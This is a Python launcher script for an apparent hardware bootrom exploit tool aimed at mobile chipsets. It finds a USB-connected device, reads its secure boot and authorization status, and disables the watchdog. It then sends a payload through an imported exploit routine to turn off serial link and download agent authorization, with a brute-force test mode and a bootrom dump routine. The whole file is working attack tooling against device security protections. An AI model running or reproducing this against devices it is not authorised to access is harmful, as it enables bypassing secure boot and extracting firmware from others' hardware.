#!/bin/python3

from src.config import Config
from src.device import Device
from src.exploit import exploit
from src.logger import log
from src.common import to_bytes

import argparse
import os

DEFAULT_CONFIG = "default_config.json5"
PAYLOAD_DIR = "payloads/"


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--config", help="Device config")
    parser.add_argument("-t", "--test", help="Testmode", action="store_true")
    parser.add_argument("-w", "--watchdog", help="Watchdog address(in hex) for testmode")
    parser.add_argument("-v", "--var_1", help="var_1 value(in hex) for testmode")
    arguments = parser.parse_args()

    if arguments.config:
        if not os.path.exists(arguments.config):
            raise RuntimeError("Config file {} doesn't exist".format(arguments.config))
    elif not os.path.exists(DEFAULT_CONFIG):
        raise RuntimeError("Default config is missing")

    device = Device().find()
    device.handshake()

    hw_code = device.get_hw_code()
    hw_sub_code, hw_ver, sw_ver = device.get_hw_dict()
    secure_boot, serial_link_authorization, download_agent_authorization = device.get_target_config()

    if arguments.config:
        config_file = open(arguments.config)
        config = Config().from_file(config_file, hw_code)
        config_file.close()
    else:
        try:
            config = Config().default(hw_code)
        except NotImplementedError as e:
            if arguments.test:
                config = Config()

                if arguments.var_1:
                    config.var_1 = int(arguments.var_1, 16)
                if arguments.watchdog:
                    config.watchdog_address = int(arguments.watchdog, 16)

                config.payload = "generic_dump_payload.bin"

                log(e)
            else:
                raise e

    if not os.path.exists(PAYLOAD_DIR + config.payload):
        raise RuntimeError("Payload file {} doesn't exist".format(PAYLOAD_DIR + config.payload))

    print()
    log("Device hw code: {}".format(hex(hw_code)))
    log("Device hw sub code: {}".format(hex(hw_sub_code)))
    log("Device hw version: {}".format(hex(hw_ver)))
    log("Device sw version: {}".format(hex(sw_ver)))
    log("Device secure boot: {}".format(secure_boot))
    log("Device serial link authorization: {}".format(serial_link_authorization))
    log("Device download agent authorization: {}".format(download_agent_authorization))
    print()

    log("Disabling watchdog timer")
    device.write32(config.watchdog_address, 0x22000064)

    if serial_link_authorization or download_agent_authorization:
        log("Disabling protection")

        with open(PAYLOAD_DIR + config.payload, "rb") as payload:
            payload = payload.read()

        result = exploit(device, config.watchdog_address, config.payload_address, config.var_0, config.var_1, payload)
        if arguments.test:
            while not result:
                config.var_1 += 1
                log("Test mode, testing " + hex(config.var_1) + "...")
                device = Device().find()
                device.handshake()
                result = exploit(device, config.watchdog_address, config.payload_address,
                                 config.var_0, config.var_1, payload)

        bootrom__name = "bootrom_" + hex(hw_code)[2:] + ".bin"

        if result == to_bytes(0xA1A2A3A4, 4):
            log("Protection disabled")
        elif result == to_bytes(0xC1C2C3C4, 4):
            dump_brom(device, bootrom__name)
        elif result == to_bytes(0x0000C1C2, 4) and device.read(4) == to_bytes(0xC1C2C3C4, 4):
            dump_brom(device, bootrom__name, True)


def dump_brom(device, bootrom__name, word_mode=False):
    log("Found send_dword, dumping bootrom to {}".format(bootrom__name))

    with open(bootrom__name, "wb") as bootrom:
        if word_mode:
            for i in range(0x20000 // 4):
                device.read(4)  # discard garbage
                bootrom.write(device.read(4))
        else:
            bootrom.write(device.read(0x20000))


if __name__ == "__main__":
    main()
